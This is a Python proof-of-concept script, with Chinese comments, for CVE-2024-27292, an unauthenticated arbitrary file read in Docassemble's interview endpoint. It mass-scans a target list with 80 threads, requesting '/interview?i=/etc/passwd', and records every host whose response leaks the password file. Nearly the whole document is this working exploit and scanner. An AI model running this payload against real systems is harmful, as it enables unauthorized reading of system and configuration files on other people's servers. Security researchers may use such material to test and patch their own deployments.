# -*- coding: utf-8 -*-
# Docassemble interview 未授权任意文件读取漏洞(CVE-2024-27292)
# icon_hash="-575790689"
# 产品简介：Docassemble是一款强大的开源工具，主要用于自动化生成和定制复杂文档，特别是在法律文档处理领域表现出色。由Jonathan Pyle个人开发者开发，是一个免费的开源专家系统，用于指导访谈和文档组装。Docassemble基于Python编写，充分利用了Python的灵活性和广泛的库支持。它采用YAML格式定义访谈逻辑，这种数据交换语言简洁且易于理解，使得非程序员也能轻松上手创建复杂的问答流程。
# 漏洞概述：Docassemble interview 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗ ███████╗██████╗  █████╗ ██████╗ 
\x1b[38m██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗╚════██║╚════██╗██╔══██╗╚════██╗
\x1b[38m██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝    ██╔╝ █████╔╝╚██████║ █████╔╝
\x1b[38m██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝    ██╔╝ ██╔═══╝  ╚═══██║██╔═══╝ 
\x1b[38m╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗   ██║  ███████╗ █████╔╝███████╗
\x1b[38m ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝   ╚═╝  ╚══════╝ ╚════╝ ╚══════╝                                                                                                                                                
                                        --author:Kucei
                                        --Version:Docassemble_interview_File-Reading(CVE-2024-27292)                                            
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('Docassemble_interview_File-Reading(CVE-2024-27292)')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/interview?i=/etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 501 and ':0:0:' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('CVE-2024-27292.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print(f"[-]{target} 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()